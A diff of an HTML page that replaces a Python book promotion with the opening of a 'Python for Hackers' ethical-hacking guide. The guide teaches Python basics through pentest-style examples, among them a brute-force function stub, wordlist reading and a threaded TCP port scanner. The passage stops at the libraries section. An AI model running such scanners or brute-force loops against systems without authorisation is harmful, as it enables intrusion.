+            .container { padding: 28px 18px 70px; }
+            .section { padding: 26px 22px; border-radius: 16px; }
+            .section-title { font-size: 20px; gap: 12px; }
+            .section-title .icon { width: 40px; height: 40px; font-size: 18px; }
+            h1 { font-size: 32px; }
+            .subtitle { font-size: 15px; }
+            .toc { padding: 20px 18px; }
+            .toc-list { grid-template-columns: 1fr; }
+            p { font-size: 14.5px; }
+            ul li { font-size: 14px; }
+            ol li { font-size: 14px; }
+            .code-block { font-size: 12px; padding: 16px 14px; }
+            .code-block code { font-size: 12px; }
+            h3 { font-size: 16px; }
+            .tool-grid { grid-template-columns: 1fr; }
+            .use-grid { grid-template-columns: 1fr; }
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 20px 12px 60px; }
+            h1 { font-size: 26px; }
+            .section { padding: 22px 16px; }
+            .section-title { font-size: 17px; }
+            .section-title .icon { width: 34px; height: 34px; font-size: 15px; }
+            .meta-bar { gap: 8px; }
+            .meta-item { font-size: 11px; padding: 6px 12px; }
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #05080e; }
+        ::-webkit-scrollbar-thumb { background: #1a2a2a; border-radius: 20px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00ff8833; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- ===== HEADER ===== -->
+    <header class="page-header">
+        <div class="badge">
+            <span class="dot"></span>
+            CYBERSUME · COMPLETE GUIDE
         </div>
-
-        <!-- ===== INTRODUCTION ===== -->
-        <p>
-            Welcome! You are about to embark on an exciting journey into the world of programming. This book is your friendly guide to learning Python, one of the most popular and versatile programming languages in the world.
+        <h1>Python for <span class="highlight">Hackers</span></h1>
+        <p class="subtitle">
+            The complete, in-depth guide to using Python for ethical hacking — from syntax basics 
+            to building real penetration testing tools. Your path from beginner to Python hacker.
         </p>
 
-        <!-- ===== PYTHON POWER BOX ===== -->
-        <div class="python-power-box">
-            <p class="big-text">🐍 print("Hello, World!")</p>
-            <p style="color:#b0b8c8;">
-                Python is the <strong style="color:#ffcc00;">#1 programming language</strong> for beginners and professionals — Start your coding journey today!
-            </p>
+        <div class="meta-bar">
+            <div class="meta-item"><span class="ico">📖</span> <span>Reading time: <strong>30 min</strong></span></div>
+            <div class="meta-item"><span class="ico">🐍</span> <span>Category: <strong>Programming</strong></span></div>
+            <div class="meta-item"><span class="ico">🛡️</span> <span>Level: <strong>Beginner → Advanced</strong></span></div>
+            <div class="meta-item"><span class="ico">⚡</span> <span>Updated: <strong>2025</strong></span></div>
         </div>
+    </header>
 
-        <!-- ===== FEATURED IMAGE WITH AMAZON LINK ===== -->
-        <div class="featured-box">
-            <div class="featured-image">
-                <a href="https://www.amazon.com/dp/B0H8K2PT16" target="_blank" rel="noopener">
-                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHjla3B0sPyo-P6nhI8RBdxKsydhg13QpUVJ6KPrQP-DETO_yQOEP3r7y_NIoy5C5hLdHvU-IFbxlbUQtgzM3BsjcwI1A_1F-WlHa5t0FroVrw-_DxCh7jWkaTqg53a45HUX1uAdIcxsN99K4bJMCmHHCtZQgnjOMuf2n-4e1x-3GIuzQja6QbEtNmVTcz/s320/ChatGPT%20Image%20Jul%2011,%202026,%2009_23_46%20PM.png" 
-                         alt="Python Programming Book"/>
-                </a>
-               
-            </div>
-            <div class="featured-cta">
-                <p>📚 <strong style="color:#ffcc00;">Get Your Copy Today!</strong></p>
-                <a class="main-link" href="https://www.amazon.com/dp/B0H8K2PT16" target="_blank" rel="noopener">
-                    🛒 Buy Now on Amazon
-                </a>
-                
-                
-            </div>
-        </div>
-<script async="async" data-cfasync="false" src="https://mergerindirect.com/aa647107e47abf023a29284552085aba/invoke.js"></script>
-<div id="container-aa647107e47abf023a29284552085aba"></div>
-        <!-- ===== WHY PYTHON ===== -->
-        <h2 id="why">💡 Why Python?</h2>
-        <p>
-            Python is a fantastic first language for many reasons:
-        </p>
-        <ul>
-            <li><strong style="color:#ffcc00;">Readability:</strong> Python code is designed to be easy to read and understand, resembling plain English in many ways.</li>
-            <li><strong style="color:#ffcc00;">Versatility:</strong> From web development and data science to artificial intelligence and automation, Python can do it all.</li>
-            <li><strong style="color:#ffcc00;">Community:</strong> Python has a massive, supportive community of developers. If you get stuck, help is always available.</li>
-            <li><strong style="color:#ffcc00;">"Batteries Included":</strong> Python comes with a vast standard library that provides tools for many tasks, saving you from reinventing the wheel.</li>
+    <!-- ===== TABLE OF CONTENTS ===== -->
+    <nav class="toc">
+        <div class="toc-title">📑 Table of Contents</div>
+        <ul class="toc-list">
+            <li><a href="#intro"><span class="num">01</span> Introduction</a></li>
+            <li><a href="#why"><span class="num">02</span> Why Python for Hackers</a></li>
+            <li><a href="#basics"><span class="num">03</span> Python Fundamentals</a></li>
+            <li><a href="#datatypes"><span class="num">04</span> Data Types &amp; Structures</a></li>
+            <li><a href="#control"><span class="num">05</span> Control Flow</a></li>
+            <li><a href="#functions"><span class="num">06</span> Functions &amp; Modules</a></li>
+            <li><a href="#files"><span class="num">07</span> File Handling</a></li>
+            <li><a href="#network"><span class="num">08</span> Networking with Sockets</a></li>
+            <li><a href="#libraries"><span class="num">09</span> Hacking Libraries</a></li>
+            <li><a href="#scripts"><span class="num">10</span> Real Hacking Scripts</a></li>
+            <li><a href="#web"><span class="num">11</span> Web Hacking</a></li>
+            <li><a href="#crypto"><span class="num">12</span> Cryptography</a></li>
+            <li><a href="#usecases"><span class="num">13</span> Use Cases</a></li>
+            <li><a href="#best"><span class="num">14</span> Best Practices</a></li>
+            <li><a href="#legal"><span class="num">15</span> Legal &amp; Ethics</a></li>
+            <li><a href="#conclusion"><span class="num">16</span> Conclusion</a></li>
         </ul>
+    </nav>
 
-        <!-- ===== WHAT YOU WILL LEARN ===== -->
-        <h2 id="learn">📖 What You Will Learn</h2>
+    <!-- ===== 01 INTRO ===== -->
+    <section class="section" id="intro">
+        <span class="section-number">01 · INTRODUCTION</span>
+        <h2 class="section-title">
+            <span class="icon">🐍</span>
+            What Is Python for Hackers?
+        </h2>
         <p>
-            This book will guide you through the fundamentals of Python programming. We'll start with the absolute basics and progressively build your knowledge until you have a solid foundation to explore more advanced topics.
+            <strong>Python</strong> is a high-level, interpreted programming language created by Guido van Rossum in 1991. Today it's the world's most popular programming language — and for good reason. It's <em>readable, powerful, and comes with a massive ecosystem of libraries</em> that make it ideal for everything from web development to machine learning.
         </p>
         <p>
-            <strong style="color:#ffcc00;">By the end of this book, you will be able to:</strong>
+            But here's the thing: Python is also the <strong>#1 language for ethical hacking and cybersecurity</strong>. Why? Because it lets you write powerful automation, build custom tooling, and connect to networks — all with just a few lines of code. Most modern hacking tools (from sqlmap to Impacket to Volatility) are written in Python.
         </p>
-        <ul class="two-col-list">
-            <li>Write and execute Python scripts</li>
-            <li>Understand and use variables, data types, and collections</li>
-            <li>Control the flow of your programs using conditions and loops</li>
-            <li>Create reusable code with functions</li>
-            <li>Work with files and user input</li>
-            <li>Grasp the core concepts of Object-Oriented Programming</li>
-            <li>Handle errors gracefully</li>
-        </ul>
+        <p>
+            In this guide, you'll go from writing your first <code>print("Hello, Hacker")</code> to building actual penetration testing scripts — port scanners, brute-forcers, web scrapers, and more. No prior programming experience required.
+        </p>
+        <div class="callout info">
+            <strong>💡 Note:</strong> This guide uses <strong>Python 3</strong> — the modern version. If you're on Kali Linux, Python 3 comes pre-installed. Just open a terminal and type <code>python3 --version</code>.
+        </div>
+    </section>
 
-        <!-- ===== BOOK HIGHLIGHT ===== -->
-        <div class="book-highlight">
-            <p class="highlight-title">⭐ From Zero to Python Hero</p>
-            <p style="color:#b0b8c8;">
-                No prior programming experience required — Start from the basics and build real-world skills!
-            </p>
+    <!-- ===== 02 WHY ===== -->
+    <section class="section" id="why">
+        <span class="section-number">02 · WHY PYTHON FOR HACKERS</span>
+        <h2 class="section-title">
+            <span class="icon">💡</span>
+            Why Ethical Hackers Love Python
+        </h2>
+        <p>
+            You might ask: <em>"Why Python and not C, C++, or Go?"</em> The answer comes down to <strong>speed of development</strong>, <strong>readability</strong>, and an <strong>unmatched security library ecosystem</strong>. Here's what makes Python special in the hacking world:
+        </p>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">⚡</span>
+                <h4>Rapid Prototyping</h4>
+                <p>Write a working exploit in 10 minutes. No compiler, no boilerplate — just code and run.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📚</span>
+                <h4>Massive Library Ecosystem</h4>
+                <p>Scapy, Requests, Paramiko, Impacket, Socket — everything you need is one <code>pip install</code> away.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🔧</span>
+                <h4>Cross-Platform</h4>
+                <p>Write on Linux, run on Windows, Mac, or Android. Same code, everywhere.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">📖</span>
+                <h4>Readable Syntax</h4>
+                <p>Python reads like English. You focus on logic, not syntax gymnastics.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🛡️</span>
+                <h4>Industry Standard</h4>
+                <p>Almost every modern pentest tool, exploit, and PoC is written in Python.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🤖</span>
+                <h4>AI &amp; ML Integration</h4>
+                <p>Build intelligent fuzzers and anomaly detectors with TensorFlow, PyTorch.</p>
+            </div>
+        </div>
+        <div class="callout">
+            <strong>🔑 Key Insight:</strong> The best hackers combine <em>Python</em> (for logic and automation) with <em>Bash</em> (for system orchestration). Together, they form the ultimate hacking duo.
+        </div>
+    </section>
+
+    <!-- ===== 03 BASICS ===== -->
+    <section class="section" id="basics">
+        <span class="section-number">03 · FUNDAMENTALS</span>
+        <h2 class="section-title">
+            <span class="icon">📚</span>
+            Python Fundamentals
+        </h2>
+        <p>
+            Every Python program starts with a simple idea: <strong>write instructions, run them</strong>. Let's begin with the basics.
+        </p>
+
+        <h3>Your First Python Script</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="cmt"># hello.py — your first Python script</span>
+<span class="fn">print</span>(<span class="str">"Hello, Ethical Hacker!"</span>)
+<span class="fn">print</span>(<span class="str">"Welcome to Python for Hackers"</span>)</code>
         </div>
 
-        <!-- ===== HOW TO USE THIS BOOK ===== -->
-        <h2 id="how">📘 How to Use This Book</h2>
-
-        <div class="tips-box">
-            <p><span class="tip-icon">💻 Code Along:</span> The best way to learn programming is by doing. I strongly encourage you to type out the code examples yourself. This will help you internalize the syntax and concepts.</p>
+        <p>Run it from the terminal:</p>
+        <div class="code-block" data-lang="bash">
+<code>python3 hello.py</code>
         </div>
 
-        <div class="tips-box">
-            <p><span class="tip-icon">🔬 Experiment:</span> Don't be afraid to break things! Change the code, see what happens, and learn from your mistakes. It's a crucial part of the learning process.</p>
+        <h3>Variables &amp; Data</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="cmt"># Variables — no need to declare types</span>
+<span class="var">target</span> = <span class="str">"192.168.1.100"</span>
+<span class="var">port</span> = <span class="num">22</span>
+<span class="var">is_open</span> = <span class="kw">True</span>
+<span class="var">version</span> = <span class="num">3.11</span>
+
+<span class="cmt"># f-strings (formatted strings) — the modern way</span>
+<span class="fn">print</span>(<span class="str">f"Target: <span class="var">{target}</span> on port <span class="var">{port}</span>"</span>)
+<span class="fn">print</span>(<span class="str">f"Status open? <span class="var">{is_open}</span>"</span>)
+
+<span class="cmt"># Multiple assignment</span>
+<span class="var">host</span>, <span class="var">user</span>, <span class="var">passwd</span> = <span class="str">"10.0.0.1"</span>, <span class="str">"admin"</span>, <span class="str">"secret"</span></code>
         </div>
 
-        <div class="tips-box">
-            <p><span class="tip-icon">☕ Take Breaks:</span> Learning to code can be intense. Take regular breaks to let your brain process the information.</p>
+        <h3>Basic Operators</h3>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>Operator</th><th>Meaning</th><th>Example</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>+</code></td><td>Addition</td><td><code>5 + 3 = 8</code></td></tr>
+                    <tr><td><code>-</code></td><td>Subtraction</td><td><code>5 - 3 = 2</code></td></tr>
+                    <tr><td><code>*</code></td><td>Multiplication</td><td><code>5 * 3 = 15</code></td></tr>
+                    <tr><td><code>/</code></td><td>Division (float)</td><td><code>5 / 3 = 1.67</code></td></tr>
+                    <tr><td><code>//</code></td><td>Integer division</td><td><code>5 // 3 = 1</code></td></tr>
+                    <tr><td><code>%</code></td><td>Modulus (remainder)</td><td><code>5 % 3 = 2</code></td></tr>
+                    <tr><td><code>**</code></td><td>Exponent</td><td><code>2 ** 8 = 256</code></td></tr>
+                    <tr><td><code>==</code></td><td>Equal to</td><td><code>5 == 5 → True</code></td></tr>
+                    <tr><td><code>!=</code></td><td>Not equal</td><td><code>5 != 3 → True</code></td></tr>
+                    <tr><td><code>and, or, not</code></td><td>Logical operators</td><td><code>True and False → False</code></td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- ===== 04 DATA TYPES ===== -->
+    <section class="section" id="datatypes">
+        <span class="section-number">04 · DATA TYPES</span>
+        <h2 class="section-title">
+            <span class="icon">📦</span>
+            Data Types &amp; Structures
+        </h2>
+        <p>
+            Python has powerful built-in data structures that make it perfect for handling everything from wordlists to network packets.
+        </p>
+
+        <h3>Strings</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="var">url</span> = <span class="str">"https://target.com/admin"</span>
+
+<span class="cmt"># Common string operations</span>
+<span class="fn">print</span>(<span class="var">url</span>.<span class="fn">upper</span>())             <span class="cmt"># HTTPS://TARGET.COM/ADMIN</span>
+<span class="fn">print</span>(<span class="var">url</span>.<span class="fn">split</span>(<span class="str">"/"</span>))           <span class="cmt"># ['https:', '', 'target.com', 'admin']</span>
+<span class="fn">print</span>(<span class="var">url</span>.<span class="fn">replace</span>(<span class="str">"admin"</span>, <span class="str">"login"</span>))
+<span class="fn">print</span>(<span class="str">"admin"</span> <span class="kw">in</span> <span class="var">url</span>)            <span class="cmt"># True</span>
+<span class="fn">print</span>(<span class="var">url</span>[<span class="num">8</span>:<span class="num">18</span>])                <span class="cmt"># Slice: 'target.com'</span></code>
         </div>
 
-        <div class="tips-box">
-            <p><span class="tip-icon">❓ Ask Questions:</span> The Python community is a great resource. Search online, ask on forums like Stack Overflow, and connect with other learners.</p>
+        <h3>Lists — Ordered Collections</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="var">ports</span> = [<span class="num">21</span>, <span class="num">22</span>, <span class="num">80</span>, <span class="num">443</span>, <span class="num">3306</span>]
+
+<span class="var">ports</span>.<span class="fn">append</span>(<span class="num">8080</span>)           <span class="cmt"># Add to end</span>
+<span class="var">ports</span>.<span class="fn">remove</span>(<span class="num">21</span>)             <span class="cmt"># Remove specific</span>
+<span class="var">ports</span>.<span class="fn">sort</span>()                   <span class="cmt"># Sort in place</span>
+
+<span class="fn">print</span>(<span class="var">ports</span>[<span class="num">0</span>])                <span class="cmt"># First element</span>
+<span class="fn">print</span>(<span class="var">ports</span>[-<span class="num">1</span>])               <span class="cmt"># Last element</span>
+<span class="fn">print</span>(<span class="fn">len</span>(<span class="var">ports</span>))              <span class="cmt"># Length</span>
+<span class="fn">print</span>(<span class="var">ports</span>[<span class="num">1</span>:<span class="num">3</span>])              <span class="cmt"># Slice [22, 80]</span>
+
+<span class="cmt"># List comprehension — Pythonic power</span>
+<span class="var">open_ports</span> = [p <span class="kw">for</span> p <span class="kw">in</span> <span class="var">ports</span> <span class="kw">if</span> p &lt; <span class="num">1000</span>]
+<span class="fn">print</span>(<span class="var">open_ports</span>)              <span class="cmt"># [22, 80, 443]</span></code>
         </div>
 
-        <!-- ===== FINAL CTA ===== -->
-        <div class="book-highlight" style="border-color:#ffcc00;background:linear-gradient(135deg,rgba(255,204,0,0.08),rgba(0,255,136,0.05));">
-            <p class="highlight-title" style="color:#ffcc00;">🐍 Let's Begin Your Python Journey!</p>
-            <p style="color:#b0b8c8;font-size:16px;">
-                Start learning one of the world's most popular programming languages today.
-            </p>
-            <br/>
-            <a class="main-link" href="https://www.amazon.com/dp/B0H8K2PT16" target="_blank" rel="noopener" 
-               style="display:inline-block;padding:15px 42px;background:linear-gradient(135deg,#ffcc00,#ff9900);color:#000000 !important;border-radius:10px;font-weight:700;font-size:16px;text-decoration:none;transition:all 0.3s ease;letter-spacing:0.5px;">
-                🛒 Buy Now on Amazon
-            </a>
-            <p class="small-note" style="color:#6a7290 !important;font-size:13px;margin-top:12px;">
-                Start your programming journey today — Get your copy now!
-            </p>
+        <h3>Dictionaries — Key-Value Pairs</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="var">target</span> = {
+    <span class="str">"ip"</span>: <span class="str">"192.168.1.1"</span>,
+    <span class="str">"ports"</span>: [<span class="num">22</span>, <span class="num">80</span>, <span class="num">443</span>],
+    <span class="str">"os"</span>: <span class="str">"Linux"</span>,
+    <span class="str">"vulnerable"</span>: <span class="kw">True</span>
+}
+
+<span class="fn">print</span>(<span class="var">target</span>[<span class="str">"ip"</span>])                <span class="cmt"># 192.168.1.1</span>
+<span class="var">target</span>[<span class="str">"country"</span>] = <span class="str">"IN"</span>          <span class="cmt"># Add new key</span>
+
+<span class="kw">for</span> key, value <span class="kw">in</span> <span class="var">target</span>.<span class="fn">items</span>():
+    <span class="fn">print</span>(<span class="str">f"<span class="var">{key}</span>: <span class="var">{value}</span>"</span>)</code>
         </div>
 
-        <hr/>
+        <h3>Tuples &amp; Sets</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="cmt"># Tuple — immutable list (cannot be changed)</span>
+<span class="var">credentials</span> = (<span class="str">"admin"</span>, <span class="str">"password123"</span>)
 
-        <!-- ===== SHARE SECTION ===== -->
-        <div class="share-section">
-            <p>📤 Share this book recommendation with your network</p>
-            <div class="share-buttons">
-                <a href="#" onclick="window.open('https://twitter.com/intent/tweet?text=Welcome%20to%20the%20World%20of%20Python%20-%20The%20perfect%20guide%20for%20beginners!%20%23Python%20%23Programming%20%23LearnToCode','_blank');return false;">
-                    🐦 Twitter
-                </a>
-                <a href="#" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(window.location.href),'_blank');return false;">
-                    📘 Facebook
-                </a>
-                <a href="#" onclick="window.open('https://www.linkedin.com/sharing/share-offsite/?url='+encodeURIComponent(window.location.href),'_blank');return false;">
-                    💼 LinkedIn
-                </a>
+<span class="cmt"># Set — unique elements, no duplicates</span>
+<span class="var">unique_ips</span> = {<span class="str">"10.0.0.1"</span>, <span class="str">"10.0.0.2"</span>, <span class="str">"10.0.0.1"</span>}
+<span class="fn">print</span>(<span class="var">unique_ips</span>)              <span class="cmt"># {'10.0.0.1', '10.0.0.2'}</span></code>
+        </div>
+    </section>
+
+    <!-- ===== 05 CONTROL ===== -->
+    <section class="section" id="control">
+        <span class="section-number">05 · CONTROL FLOW</span>
+        <h2 class="section-title">
+            <span class="icon">🔀</span>
+            Control Flow — Making Decisions
+        </h2>
+
+        <h3>If / Elif / Else</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="var">port</span> = <span class="num">443</span>
+
+<span class="kw">if</span> <span class="var">port</span> == <span class="num">22</span>:
+    <span class="fn">print</span>(<span class="str">"SSH detected"</span>)
+<span class="kw">elif</span> <span class="var">port</span> == <span class="num">80</span>:
+    <span class="fn">print</span>(<span class="str">"HTTP detected"</span>)
+<span class="kw">elif</span> <span class="var">port</span> == <span class="num">443</span>:
+    <span class="fn">print</span>(<span class="str">"HTTPS detected — encrypted"</span>)
+<span class="kw">else</span>:
+    <span class="fn">print</span>(<span class="str">f"Unknown service on port <span class="var">{port}</span>"</span>)</code>
+        </div>
+
+        <h3>For Loops</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="cmt"># Loop through a list</span>
+<span class="kw">for</span> port <span class="kw">in</span> [<span class="num">22</span>, <span class="num">80</span>, <span class="num">443</span>]:
+    <span class="fn">print</span>(<span class="str">f"Scanning port <span class="var">{port}</span>"</span>)
+
+<span class="cmt"># Loop with index</span>
+<span class="kw">for</span> i, port <span class="kw">in</span> <span class="fn">enumerate</span>([<span class="num">22</span>, <span class="num">80</span>, <span class="num">443</span>]):
+    <span class="fn">print</span>(<span class="str">f"<span class="var">{i+1}</span>. Port <span class="var">{port}</span>"</span>)
+
+<span class="cmt"># Loop through range</span>
+<span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">255</span>):
+    <span class="fn">print</span>(<span class="str">f"192.168.1.<span class="var">{i}</span>"</span>)
+
+<span class="cmt"># Loop through a dictionary</span>
+<span class="var">target</span> = {<span class="str">"ip"</span>: <span class="str">"10.0.0.1"</span>, <span class="str">"port"</span>: <span class="num">22</span>}
+<span class="kw">for</span> key, value <span class="kw">in</span> <span class="var">target</span>.<span class="fn">items</span>():
+    <span class="fn">print</span>(<span class="str">f"<span class="var">{key}</span> = <span class="var">{value}</span>"</span>)</code>
+        </div>
+
+        <h3>While Loops</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="var">attempts</span> = <span class="num">0</span>
+<span class="kw">while</span> <span class="var">attempts</span> &lt; <span class="num">5</span>:
+    <span class="fn">print</span>(<span class="str">f"Attempt <span class="var">{attempts+1}</span>"</span>)
+    <span class="var">attempts</span> += <span class="num">1</span>
+
+<span class="cmt"># Loop with break and continue</span>
+<span class="kw">for</span> port <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">1025</span>):
+    <span class="kw">if</span> port == <span class="num">100</span>:
+        <span class="kw">break</span>              <span class="cmt"># Exit the loop</span>
+    <span class="kw">if</span> port % <span class="num">2</span> == <span class="num">0</span>:
+        <span class="kw">continue</span>           <span class="cmt"># Skip even ports</span>
+    <span class="fn">print</span>(port)</code>
+        </div>
+    </section>
+
+    <!-- ===== 06 FUNCTIONS ===== -->
+    <section class="section" id="functions">
+        <span class="section-number">06 · FUNCTIONS &amp; MODULES</span>
+        <h2 class="section-title">
+            <span class="icon">🧩</span>
+            Functions, Modules &amp; Reusability
+        </h2>
+
+        <h3>Defining Functions</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">def</span> <span class="fn">scan_port</span>(host, port):
+    <span class="str">"""Simple TCP port scanner using sockets."""</span>
+    <span class="kw">import</span> socket
+    sock = socket.<span class="fn">socket</span>(socket.AF_INET, socket.SOCK_STREAM)
+    sock.<span class="fn">settimeout</span>(<span class="num">1</span>)
+    result = sock.<span class="fn">connect_ex</span>((host, port))
+    sock.<span class="fn">close</span>()
+    <span class="kw">return</span> result == <span class="num">0</span>
+
+<span class="cmt"># Call the function</span>
+<span class="kw">if</span> <span class="fn">scan_port</span>(<span class="str">"192.168.1.1"</span>, <span class="num">22</span>):
+    <span class="fn">print</span>(<span class="str">"[+] Port 22 is OPEN"</span>)</code>
+        </div>
+
+        <h3>Default &amp; Keyword Arguments</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">def</span> <span class="fn">brute_force</span>(target, port=<span class="num">22</span>, threads=<span class="num">10</span>, verbose=<span class="kw">False</span>):
+    <span class="kw">if</span> verbose:
+        <span class="fn">print</span>(<span class="str">f"Attacking <span class="var">{target}</span>:<span class="var">{port}</span> with <span class="var">{threads}</span> threads"</span>)
+    <span class="cmt"># ... attack logic ...</span>
+
+<span class="fn">brute_force</span>(<span class="str">"10.0.0.1"</span>)
+<span class="fn">brute_force</span>(<span class="str">"10.0.0.1"</span>, port=<span class="num">21</span>, verbose=<span class="kw">True</span>)</code>
+        </div>
+
+        <h3>Importing Modules</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="cmt"># Import whole module</span>
+<span class="kw">import</span> socket
+
+<span class="cmt"># Import specific functions</span>
+<span class="kw">from</span> socket <span class="kw">import</span> socket, gethostbyname
+
+<span class="cmt"># Aliased import</span>
+<span class="kw">import</span> socket <span class="kw">as</span> s
+
+<span class="cmt"># Common modules for hackers</span>
+<span class="kw">import</span> os, sys, subprocess, socket, requests, re, json, base64, hashlib</code>
+        </div>
+    </section>
+
+    <!-- ===== 07 FILES ===== -->
+    <section class="section" id="files">
+        <span class="section-number">07 · FILE HANDLING</span>
+        <h2 class="section-title">
+            <span class="icon">📁</span>
+            File Handling — Reading Wordlists &amp; Logs
+        </h2>
+        <p>
+            Most hacking scripts deal with files: wordlists for brute-force, log files for analysis, config files, and output reports.
+        </p>
+
+        <div class="code-block" data-lang="python">
+<code><span class="cmt"># Read a wordlist line by line (memory-efficient)</span>
+<span class="kw">with</span> <span class="fn">open</span>(<span class="str">"/usr/share/wordlists/rockyou.txt"</span>, <span class="str">"r"</span>, errors=<span class="str">"ignore"</span>) <span class="kw">as</span> f:
+    <span class="kw">for</span> line <span class="kw">in</span> f:
+        password = line.<span class="fn">strip</span>()
+        <span class="fn">print</span>(<span class="str">f"Trying: <span class="var">{password}</span>"</span>)
+
+<span class="cmt"># Write results to a file</span>
+<span class="kw">with</span> <span class="fn">open</span>(<span class="str">"results.txt"</span>, <span class="str">"w"</span>) <span class="kw">as</span> f:
+    f.<span class="fn">write</span>(<span class="str">"Scan complete\n"</span>)
+    f.<span class="fn">write</span>(<span class="str">f"Found 3 open ports\n"</span>)
+
+<span class="cmt"># Append to a file (doesn't overwrite)</span>
+<span class="kw">with</span> <span class="fn">open</span>(<span class="str">"log.txt"</span>, <span class="str">"a"</span>) <span class="kw">as</span> f:
+    f.<span class="fn">write</span>(<span class="str">f"[+] New target: <span class="var">{ip}</span>\n"</span>)
+
+<span class="cmt"># Read entire file at once</span>
+<span class="kw">with</span> <span class="fn">open</span>(<span class="str">"config.json"</span>) <span class="kw">as</span> f:
+    data = f.<span class="fn">read</span>()</code>
+        </div>
+
+        <h3>Working with JSON</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> json
+
+<span class="cmt"># Parse JSON from file</span>
+<span class="kw">with</span> <span class="fn">open</span>(<span class="str">"scan.json"</span>) <span class="kw">as</span> f:
+    data = json.<span class="fn">load</span>(f)
+
+<span class="fn">print</span>(data[<span class="str">"hosts"</span>])
+
+<span class="cmt"># Save results as JSON</span>
+<span class="var">results</span> = {<span class="str">"target"</span>: <span class="str">"192.168.1.1"</span>, <span class="str">"ports"</span>: [<span class="num">22</span>, <span class="num">80</span>, <span class="num">443</span>]}
+<span class="kw">with</span> <span class="fn">open</span>(<span class="str">"output.json"</span>, <span class="str">"w"</span>) <span class="kw">as</span> f:
+    json.<span class="fn">dump</span>(results, f, indent=<span class="num">2</span>)</code>
+        </div>
+    </section>
+
+    <!-- ===== 08 NETWORK ===== -->
+    <section class="section" id="network">
+        <span class="section-number">08 · NETWORKING</span>
+        <h2 class="section-title">
+            <span class="icon">🌐</span>
+            Networking with Sockets
+        </h2>
+        <p>
+            The <code>socket</code> module is the foundation of all network hacking in Python. It lets you connect to hosts, send data, and build custom protocols.
+        </p>
+
+        <h3>Basic Socket Connection</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> socket
+
+<span class="cmt"># Create a TCP socket</span>
+s = socket.<span class="fn">socket</span>(socket.AF_INET, socket.SOCK_STREAM)
+s.<span class="fn">settimeout</span>(<span class="num">2</span>)
+
+<span class="cmt"># Try to connect</span>
+<span class="kw">try</span>:
+    s.<span class="fn">connect</span>((<span class="str">"192.168.1.1"</span>, <span class="num">22</span>))
+    <span class="fn">print</span>(<span class="str">"[+] Port 22 is open"</span>)
+    banner = s.<span class="fn">recv</span>(<span class="num">1024</span>)
+    <span class="fn">print</span>(<span class="str">f"Banner: <span class="var">{banner.decode()}</span>"</span>)
+<span class="kw">except</span> socket.timeout:
+    <span class="fn">print</span>(<span class="str">"[-] Connection timed out"</span>)
+<span class="kw">except</span> ConnectionRefusedError:
+    <span class="fn">print</span>(<span class="str">"[-] Port closed"</span>)
+<span class="kw">finally</span>:
+    s.<span class="fn">close</span>()</code>
+        </div>
+
+        <h3>Resolving Hostnames</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> socket
+
+<span class="cmt"># Get IP from domain name</span>
+ip = socket.<span class="fn">gethostbyname</span>(<span class="str">"example.com"</span>)
+<span class="fn">print</span>(<span class="str">f"example.com → <span class="var">{ip}</span>"</span>)
+
+<span class="cmt"># Reverse lookup — get domain from IP</span>
+host = socket.<span class="fn">gethostbyaddr</span>(<span class="str">"8.8.8.8"</span>)
+<span class="fn">print</span>(host)  <span class="cmt"># ('dns.google', [], ['8.8.8.8'])</span></code>
+        </div>
+
+        <h3>Multi-Threaded Port Scanner</h3>
+        <div class="code-block" data-lang="python">
+<code><span class="kw">import</span> socket
+<span class="kw">from</span> concurrent.futures <span class="kw">import</span> ThreadPoolExecutor
+
+<span class="kw">def</span> <span class="fn">scan</span>(host, port):
+    s = socket.<span class="fn">socket</span>(socket.AF_INET, socket.SOCK_STREAM)
+    s.<span class="fn">settimeout</span>(<span class="num">1</span>)
+    <span class="kw">if</span> s.<span class="fn">connect_ex</span>((host, port)) == <span class="num">0</span>:
+        <span class="fn">print</span>(<span class="str">f"[+] Port <span class="var">{port}</span> OPEN"</span>)
+    s.<span class="fn">close</span>()
+
+<span class="var">target</span> = <span class="str">"192.168.1.1"</span>
+<span class="kw">with</span> <span class="fn">ThreadPoolExecutor</span>(max_workers=<span class="num">100</span>) <span class="kw">as</span> executor:
+    <span class="kw">for</span> port <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">1025</span>):
+        executor.<span class="fn">submit</span>(scan, target, port)</code>
+        </div>
+    </section>
+
+    <!-- ===== 09 LIBRARIES ===== -->
+    <section class="section" id="libraries">
+        <span class="section-number">09 · HACKING LIBRARIES</span>
+        <h2 class="section-title">
+            <span class="icon">📚</span>
+            Essential Python Libraries for Hackers
+        </h2>
